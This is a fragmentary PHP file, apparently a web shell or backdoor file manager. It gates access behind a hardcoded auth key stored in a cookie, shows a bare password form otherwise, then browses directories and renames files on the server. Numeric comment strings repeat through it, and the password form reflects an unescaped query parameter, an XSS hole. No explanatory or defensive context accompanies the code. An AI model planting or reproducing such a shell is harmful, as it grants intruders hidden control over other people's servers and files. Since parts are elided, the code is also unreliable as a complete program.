...
$auth_key = "21fdbabdd1cfdce91eeca5bd880f1922";
...
$pass = false;
if (isset($_COOKIE['pw_name_66312'])) {
    if(($_COOKIE['pw_name_66312']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_66312'])) {
        if(($_POST['pw_name_66312']) == $auth_key) {
            setcookie("pw_name_66312", $_POST['pw_name_66312']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_66312' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726735647931193 1726735647729280 1726735647229498 1726735647939240
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726735647931193 1726735647729280 1726735647229498 1726735647939240
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726735647931193 1726735647729280 1726735647229498 1726735647939240
            $name = PATH . "/" . $_GET['r'];
